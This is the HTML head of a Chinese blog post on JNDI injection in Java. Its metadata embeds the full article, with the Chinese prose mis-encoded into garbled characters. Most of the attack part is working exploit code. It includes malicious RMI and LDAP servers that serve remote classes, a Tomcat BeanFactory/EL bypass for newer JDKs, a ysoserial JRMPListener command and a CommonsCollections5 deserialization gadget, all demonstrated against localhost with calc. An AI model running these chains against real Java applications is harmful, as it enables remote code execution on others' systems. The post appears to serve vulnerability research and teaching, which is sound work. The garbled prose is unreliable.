<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>JNDI | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="0x01 RMI client package rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(&#34;rmi://127.0.0.1:1099/Jie&#34;); System.out.println(&#34;ret: &#34; &#43; ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = &#34;http://localhost:1098/&#34;; Reference">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/jndi/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/jndi/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="JNDI" />
<meta property="og:description" content="0x01 RMI client package rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(&#34;rmi://127.0.0.1:1099/Jie&#34;); System.out.println(&#34;ret: &#34; &#43; ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = &#34;http://localhost:1098/&#34;; Reference" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/jndi/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-01-23T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-01-23T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="JNDI"/>
<meta name="twitter:description" content="0x01 RMI client package rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(&#34;rmi://127.0.0.1:1099/Jie&#34;); System.out.println(&#34;ret: &#34; &#43; ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = &#34;http://localhost:1098/&#34;; Reference"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "JNDI",
      "item": "https://Jiecub3.github.io/zh/posts/java/jndi/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "JNDI",
  "name": "JNDI",
  "description": "0x01 RMI client package rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(\u0026#34;rmi://127.0.0.1:1099/Jie\u0026#34;); System.out.println(\u0026#34;ret: \u0026#34; + ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = \u0026#34;http://localhost:1098/\u0026#34;; Reference",
  "keywords": [
    
  ],
  "articleBody": "0x01 RMI client\npackage rmi; import javax.naming.InitialContext; import javax.naming.NamingException; public class client { public static void main(String[] args) { try { Object ret = new InitialContext().lookup(\"rmi://127.0.0.1:1099/Jie\"); System.out.println(\"ret: \" + ret); } catch ( NamingException e) { e.printStackTrace(); } } } Server\nimport com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String args[]) { try { Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = \"http://localhost:1098/\"; Reference reference = new Reference(\"evilexp\",\"evilexp\", factoryUrl); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"Jie\", wrapper); System.err.println(\"Server ready, factoryUrl:\" + factoryUrl); } catch (Exception e) { System.err.println(\"Server exception: \" + e.toString()); e.printStackTrace(); } } } evilexp\npublic class evilexp { public evilexp() throws Exception{ Runtime.getRuntime().exec(\"calc\"); } static { System.out.println(\"Static block executed.\"); } } åœ¨evilexp.classç›®å½•ä¸‹èµ·ä¸€ä¸ªæœåŠ¡ python3 -m http.server 1098 å¯åŠ¨Server å¯åŠ¨clientè°ƒç”¨è§¦å‘ 0x02 åˆ†æ ä½ç‰ˆæœ¬jdk lookupå¼€å§‹\ngetURLOrDefaultInitCtx()æ ¹æ®rmiåè®®è·å–åˆ°rmiURLContextå¯¹è±¡\nä¸€è·¯åˆ°æœ€åä¸€ä¸ªlookup\nlookupä¸€è·¯åˆ°decodeObject()\nè·Ÿè¿›NamingManager.getObjectInstance()\ngetObjectFactoryFromReference()ä¸­ä¼šè·å–æˆ‘ä»¬çš„å‚åº“ç±»\nä¼šå…ˆæœ¬åœ°æŸ¥æ‰¾åŠ è½½è®¾ç½®çš„factoryNameç±»ï¼Œæ‰¾ä¸åˆ°ä¼šè¿œç¨‹codebaseçš„åœ°å€å»åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»\nç”¨Appè¿™ä¸ªåŠ è½½å™¨è¿›è¡ŒåŠ è½½\nè¿œç¨‹åŠ è½½ï¼ŒFactoryURLClassLoaderæ˜¯URLClassLoaderçš„å­ç±»\nä¸Šé¢Class.forNameç¬¬äºŒä¸ªå‚æ•°æ˜¯trueï¼Œè¿™é‡ŒåŠ è½½çš„æ—¶å€™å°±èƒ½è§¦å‘staticåŒºåŸŸçš„ä»£ç \nå¾—åˆ°classåè¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é‡Œè§¦å‘è‡ªæ„æ–¹æ³•çš„ä»£ç ï¼ˆè¿™é‡Œä¼šè½¬åŒ–æˆObjectFactoryç±»ï¼Œæƒ³ä¸æŠ¥é”™ï¼Œæ¶æ„å¯ä»¥ç»§æ‰¿è¿™ä¸ªæ¥å£ï¼‰\nè¿”å›åè¿˜ä¼šè°ƒç”¨getObjectInstance()æ¬¡æ–¹æ³•\nå°ç»“ å¾—ä¸‹é¢è¿™3ä¸ªä»£ç å—éƒ½èƒ½æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç \nstaticåŒºåŸŸ\nè‡ªæ„æ–¹æ³•\ngetObjectInstance()\né«˜ç‰ˆæœ¬jdk åœ¨è°ƒç”¨NamingManager.getObjectInstance()å‰å¢åŠ äº†ä¸€ä¸ªæ£€æµ‹\nif (var8 != null \u0026\u0026 var8.getFactoryClassLocation() != null \u0026\u0026 !trustURLCodebase) { var8æ˜¯æˆ‘ä»¬çš„Referenceï¼Œvar8.getFactoryClassLocation()å°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„è¿œç¨‹åœ°å€codebaseï¼ŒtrustURLCodebaseé»˜è®¤æ˜¯false\nè¿™é‡Œæ„æ€å°±æ˜¯é»˜è®¤ä¸è®©æˆ‘ä»¬è®¾ç½®è¿œç¨‹åœ°å€äº†ï¼Œä»è€Œé˜²å¾¡æˆ‘ä»¬è¿œç¨‹åŠ è½½æ¶æ„ç±»\ntry1 æœ¬åœ°Factoryç±» åˆ©ç”¨æœ¬åœ°Factoryç±» getObjectInstance()\né‚£æˆ‘ä»¬æŠŠclassFactoryLocationè®¾ç½®æˆnullï¼Œè¿™é‡ŒEvilæœ¬åœ°å¾—æœ‰ã€‚ç„¶åè¿›è¡Œè°ƒè¯•\nReference reference = new Reference(\"Evil\",\"Evil\", null); æ²¡æœ‰è§¦å‘æŠ¥é”™ï¼Œæ¥åˆ°getObjectFactoryFromReferenceï¼Œå‘ç°å…¶ä»£ç é€»è¾‘å¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œè¿˜æ˜¯å…ˆæœ¬åœ°ï¼Œç„¶åè¿œç¨‹ï¼Œä½†æ˜¯å› ä¸ºå‰é¢ifæ£€æµ‹çš„é—®é¢˜ï¼Œè¿™é‡Œcodebaseåªèƒ½æ˜¯nullï¼Œé™¤éä¿®æ”¹trustURLCodebaseï¼ˆè°æ²¡äº‹æ”¹è¿™ç©æ„ï¼â€”â€”ï¼ï¼‰\nç„¶åçš„è¯ï¼Œæƒ³é«˜ç‰ˆæœ¬åˆ©ç”¨rmiï¼Œå°±åªèƒ½åˆ©ç”¨å®¢æˆ·ç«¯æœ¬åœ°çš„ç±»ï¼Œä¸Šé¢3ä¸ªåˆ©ç”¨ç‚¹è¿˜æ˜¯é€‚ç”¨çš„ï¼Œä½†æ˜¯æƒ³æƒ³å…¶å®staticå’Œè‡ªæ„æ–¹æ³•ä¸å¤ªå¯èƒ½å­˜åœ¨åˆ©ç”¨çš„åœ°æ–¹ï¼Œæ‰€ä»¥å…¶å®è¿˜æ˜¯å»æ‰¾getObjectInstance()ï¼Œè¿™é‡Œæ‰¾çš„è¯å…¶å®å°±æœ‰æ€è·¯äº†getObjectInstance()æ˜¯ObjectFactoryæ¥å£çš„æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬å»æ‰¾ObjectFactoryçš„ç»§æ‰¿ç±»å°±è¡Œã€‚\nä¸Šé¢è¿™ç§æ–¹å¼è‡ªç„¶ä¹Ÿä¾èµ–äºå…¶ä»–ç»„ä»¶ä¾èµ–ï¼Œæ·»åŠ ä¸‹é¢tomcatä¾èµ–\norg.apache.tomcat tomcat-catalina 8.5.0 org.apache.tomcat.embed tomcat-embed-el 8.5.0 package rmi; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class RMIServer { public static void main(String[] args) throws Exception{ Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:1099\"); InitialContext ctx = new InitialContext(env); LocateRegistry.createRegistry(1099); ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", null); ref.add(new StringRefAddr(\"forceString\", \"xx=eval\")); ref.add(new StringRefAddr(\"xx\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\\\")\")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); ctx.bind(\"Jie\", referenceWrapper); } } æˆåŠŸæ‰§è¡Œ\nBeanFactoryåˆ©ç”¨ ä¼šå»è·å–forceStringçš„å€¼ï¼Œå…ˆä¼šé€šè¿‡,åˆ†å‰²æˆå¤šå¯¹methodï¼Œç„¶åé€šè¿‡=åˆ†å‰²æ¯å¯¹å€¼ï¼Œå‰é¢çš„ä¸ºæœ€åæ”¾å…¥mapçš„keyï¼Œåé¢ä¸ºè¦è·å–çš„methodåå­—ï¼Œç„¶åä»beanclassè·å–è¿™ä¸ªæ–¹æ³•ï¼ˆæ³¨æ„è¿™é‡Œåªä¼šè·å–Stringä¸ºå‚æ•°çš„æ–¹æ³•ï¼Œæˆ‘ä»¬çœ‹åˆ°paramTypesæ˜¯ä¸å¯æ§çš„ï¼‰ï¼Œç„¶åputåˆ°forcedè¿™ä¸ªHashmapä¸­\nbeanClassæ˜¯é€šè¿‡beanClassNameå’ŒAppåŠ è½½å™¨å¾—åˆ°çš„class\nç„¶ååˆ°ä¸‹é¢è¿™ä¸ªwhileä¸­ï¼Œè¿™é‡Œè·å–Typeï¼Œå½“ä¸ä¸ºifä¸­çš„å€¼æ—¶ï¼Œä¼šä»å‰é¢è®¾ç½®çš„forcedä¸­é€šè¿‡è¿™ä¸ªTypeåå­—è·å–å¯¹åº”çš„methodï¼Œç„¶åé€šè¿‡åå°„è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸¤ä¸ªåœ°æ–¹å€¼ï¼ˆxxï¼‰è¦å¯¹åº”\nbeanå¯¹è±¡å°±æ˜¯beanClasså®ä¾‹åŒ–ï¼Œç„¶åè¿™ä¸ªåœ°æ–¹æ‰§è¡ŒæˆåŠŸjavax.el.ELProcessor#eval\nObject bean = beanClass.newInstance(); åˆ©ç”¨å°ç»“ BeanFactory#getObjectInstanceåˆ©ç”¨æ¡ä»¶\nJDKæˆ–è€…å¸¸ç”¨åº“çš„ç±» æœ‰publicä¿®é¥°çš„æ— å‚æ„é€ æ–¹æ³• //æ˜¾è€Œæ˜“è§ï¼Œç›´æ¥é€šè¿‡newInstance()è·å¾—å¯¹è±¡çš„ publicä¿®é¥°çš„åªæœ‰ä¸€ä¸ªString.classç±»å‹å‚æ•°çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•å¯ä»¥é€ æˆæ¼æ´ //åªèƒ½è°ƒç”¨Stringæ–¹æ³• ä¸Šé¢å°±åˆ©ç”¨çš„elè¡¨è¾¾å¼\ntry2 ååºåˆ—åŒ– åˆ©ç”¨registerè¿”å›æ¶æ„åºåˆ—åŒ–æ•°æ® ååºåˆ—åŒ– æ‰§è¡Œgadget\nå…¶å®åˆ†æè¿‡RMIååºåˆ—åŒ–ä¸éš¾æƒ³åˆ°ã€‚lookupä¸­clientä¼šå’Œregisterè¿›è¡Œæ•°æ®ä¼ è¾“ä¸”å­˜åœ¨ååºåˆ—åŒ–\nC:\\MyFiles\\Tools\\ENV\\JAVA\\jdk1.8.0_192\\bin\\java.exe -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 \"calc\" ç„¶åè¿è¡Œclient\nç›´æ¥åˆ°æœ€åé‚£ä¸ªlookupä¸­ï¼Œè¿™é‡Œä¼šå‘registerä¼ åºåˆ—åŒ–æ•°æ®åšå‡†å¤‡ï¼Œç„¶åè·Ÿè¿›è¿™ä¸ªinvoke\nåˆ°executeCall(),è¿™é‡Œthis.getInputStream();ä¼šæ¥æ”¶registerä¼ å›çš„åºåˆ—åŒ–æ•°æ®ï¼ˆè¿™é‡Œæˆ‘ä»¬æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®å³å¯åˆ©ç”¨ï¼‰ï¼Œç„¶åä¸‹æ–¹è¿›è¡Œååºåˆ—åŒ–ã€‚\nä¹Ÿå°±æ˜¯è¯´rmiåè®®åœ¨é«˜ç‰ˆæœ¬ä¸‹ï¼Œå¯ä»¥æ‰“gadget\n0x03 LDAP åœ¨jdk8u191ä¹‹å‰éƒ½èƒ½ç”¨ldapåŠ è½½è¿œç¨‹æ¶æ„ç±»\nldapæœåŠ¡ç«¯éœ€è¦ä»¥ä¸‹ä¾èµ–\ncom.unboundid unboundid-ldapsdk 6.0.7 LDAPServer.java\npackage ldap; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class LDAPServer{ private static final String LDAP_BASE = \"dc=ldap\"; public static void main (String[] args) { String url = \"http://127.0.0.1:4444/#evilexp\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos \u003e 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: åˆ©ç”¨ LDAP + Reference Factory e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); // Payload2: è¿”å›åºåˆ—åŒ– Gadget // try { // e.addAttribute(\"javaSerializedData\", Base64.decode(\"...\")); // } catch (ParseException exception) { // exception.printStackTrace(); // } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } JNDIDemo.java\npackage ldap; import javax.naming.InitialContext; public class JNDIDemo { public static void main(String[] args) throws Exception { InitialContext ctx = new InitialContext(); ctx.lookup(\"ldap://127.0.0.1:1389/test\"); } } 0x04 åˆ†æ ä½ç‰ˆæœ¬jdk \u003c 8u191 åœ¨è·å–ä¸Šä¸‹æ–‡æ—¶ï¼Œæ ¹æ®åè®®ä¼šè·å–ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œ\nè·Ÿè¿›ResourceManager.getFactory()\nclassSuffixè¿™ä¸ªå€¼æ˜¯è·Ÿè¿›åè®®åå­—æ‹¼æ¥çš„ï¼Œç„¶åå»å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œåé¢ä¼šreturn factory;\nç„¶åä¼šåˆ°ldapURLContextFactory.getObjectInstanceï¼Œè¿”å›ä¸€ä¸ªldapçš„ä¸Šä¸‹æ–‡(ldapURLContext)\nç„¶ååç»­this.getRootURLContextè¿™é‡Œè°ƒç”¨çš„æ˜¯ldapURLContext.getRootURLContextï¼Œvar3æ˜¯LdapCtxï¼Œä¹Ÿå°±å¯¼è‡´åé¢å’Œrmiçš„èµ°å‘ä¸ä¸€æ ·äº†\nc_lookup ç„¶åä¸€ç›´åˆ°c_lookupè¿™é‡Œï¼Œthis.doSearchOnceä¼šå‘ldapå‘é€è¯·æ±‚è·å–å€¼ã€‚\nç„¶åldapæœåŠ¡ç«¯ï¼Œå°†è¿™ä¸ªå€¼ä¼ ç»™clientç«¯\nç„¶åä»è¿”å›çš„å€¼è·å–attributeså±æ€§ï¼Œæˆ‘ä»¬æ˜¯è®¾ç½®äº†javaClassNameçš„ï¼Œæ‰€ä»¥è¿›å…¥\nè¿™é‡Œiféƒ½ä¸ä¼šè¿›ï¼Œåˆ°æœ€åä¸€ä¸ªä¸‰å…ƒè¡¨è¾¾å¼\nreturn var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) \u0026\u0026 !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2); ä¼šè¿›å…¥decodeReference()ï¼Œç„¶ååˆå§‹åŒ–ä¸€ä¸ªReferenceå¯¹è±¡å¹¶return\nç„¶åå›åˆ°c_lookupï¼Œè¿›å…¥getObjectInstance()ï¼Œå…¶åç»­é€»è¾‘å’Œrmiæ˜¯ä¸€æ ·çš„\nç„¶ågetObjectFactoryFromReferenceä¸­è§¦å‘åˆ©ç”¨\nå°ç»“ ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“ldapå’Œrmiåœ¨è°ƒç”¨è¿œç¨‹æ¶æ„ç±»ä¸Šçš„è¿‡ç¨‹æ˜¯æœ‰åŒºåˆ«çš„\nldapè°ƒç”¨æ ˆ\nc_lookup:1085, LdapCtx (com.sun.jndi.ldap) p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx) lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:94, ldapURLContext (com.sun.jndi.url.ldap) lookup:417, InitialContext (javax.naming) main:8, JNDIDemo (ldap) rmiè°ƒç”¨æ ˆ\ndecodeObject:475, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) main:9, client (rmi) var8.getFactoryClassLocation()çš„æ£€æµ‹æ˜¯åœ¨rmiçš„decodeObjectä¸­ï¼Œè€Œldapåè®®æ˜¯è°ƒç”¨çš„å…¶ä»–lookupå¹¶ä¸ä¼šè°ƒç”¨decodeObjectæ¥å®ç°è¿œç¨‹åŠ è½½ï¼Œä¸¤è€…åè®®è°ƒç”¨æœºåˆ¶æ˜¯ä¸ä¸€æ ·çš„\næ‰€ä»¥åœ¨8u113~8u190è¿™æ®µcom.sun.jndi.rmi.object.trustURLCodebase é»˜è®¤å€¼ä¸ºfalseï¼Œldapä¸å—å½±å“ä¾ç„¶å¯ä»¥è°ƒç”¨è¿œç¨‹æ¶æ„ç±»\né«˜ç‰ˆæœ¬jdk 8u191ä»¥åï¼Œåœ¨è¿œç¨‹åŠ è½½ç±»æ—¶åŠ å…¥äº†trustURLCodebaseçš„åˆ¤æ–­ï¼Œå½»åº•æœç»äº†è¿œç¨‹åŠ è½½æ¶æ„ç±»äº†ã€‚\ntry1 ååºåˆ—åŒ– è¿˜æœ‰ä¸€ä¸ªç‚¹decodeObject()çš„ deserializeObject()ç¬¦åˆæ¡ä»¶ä¼šæŠŠldapæœåŠ¡ç«¯è¿”å›çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œæœ‰èƒ½åˆ©ç”¨çš„ä¾èµ–å°±èƒ½æ‰“gadgetå“‡ï¼\nç»™javaSerializedDataè®¾ç½®å€¼ï¼Œè¿›å…¥deserializeObject()\næˆ‘è¿™é‡Œè°ƒè¯•æœ‰ç‚¹é—®é¢˜ï¼Œä¸èƒ½æ­£å¸¸è°ƒè¯•åˆ°readObjectï¼Œå¯èƒ½æ˜¯ ä¸æ˜¯å®Œæ•´æºç çš„åŸå› ï¼Œä¸è¿‡æ˜¯æˆåŠŸååºåˆ—åŒ–äº†çš„\nè¿™é‡Œvar0æ•°æ®å°±æ˜¯CC5çš„åºåˆ—åŒ–æ•°æ®\ndemoä»£ç  JNDIDemoè¿˜æ˜¯ä¸€æ ·çš„\nLDAPServer\npackage ldap; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class LDAPServer{ private static final String LDAP_BASE = \"dc=ldap\"; public static void main (String[] args) { String url = \"http://127.0.0.1:4444/#evilexp\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos \u003e 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: åˆ©ç”¨ LDAP + Reference Factory // e.addAttribute(\"javaCodeBase\", cbstring); // e.addAttribute(\"objectClass\", \"javaNamingReference\"); // e.addAttribute(\"javaFactory\", this.codebase.getRef()); // Payload2: è¿”å›åºåˆ—åŒ– Gadget try { e.addAttribute(\"javaSerializedData\", CC5.getpayload()); } catch (Exception exception) { exception.printStackTrace(); } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } CC5\npackage ldap; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; public class CC5 { public static void main(String[] args) throws Exception { byte[] o1 = getpayload(); } static byte[] getpayload() throws Exception { InvokerTransformer invokerTransformer2 = new InvokerTransformer(\"exec\",new Class[]{String.class}, new Object[]{\"calc\"}); InvokerTransformer invokerTransformer1 = new InvokerTransformer(\"invoke\",new Class[]{Object.class, Object[].class}, new Object[]{null, null}); InvokerTransformer invokerTransformer = new InvokerTransformer(\"getMethod\",new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\",null}); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class); Transformer[] transformers=new Transformer[]{constantTransformer,invokerTransformer,invokerTransformer1,invokerTransformer2}; Transformer keyTransformer = new ChainedTransformer(transformers); LazyMap fistrmap = (LazyMap) LazyMap.decorate(new HashMap(),keyTransformer); fistrmap.put(\"fistrmap\",1111); TiedMapEntry tiedMapEntry = new TiedMapEntry(fistrmap,\"nono\"); Class\u003c?\u003e aClass = Class.forName(\"javax.management.BadAttributeValueExpException\"); Constructor\u003c?\u003e o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\"val\"); val.setAccessible(true); val.set(o1, tiedMapEntry); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(o1); oos.flush(); byte[] serializedData = bos.toByteArray(); return serializedData; } } ååºåˆ—åŒ–ç‚¹2 é™¤äº†ç¬¬ä¸€ä¸ªifå¤„å¯ä»¥ååºåˆ—åŒ–ï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹å¯ä»¥\ne.addAttribute(\"javaClassName\", \"foo\"); e.addAttribute(\"javaReferenceAddress\",\"$1$String$$\"+new BASE64Encoder().encode(serializeObject(getPayload()))); 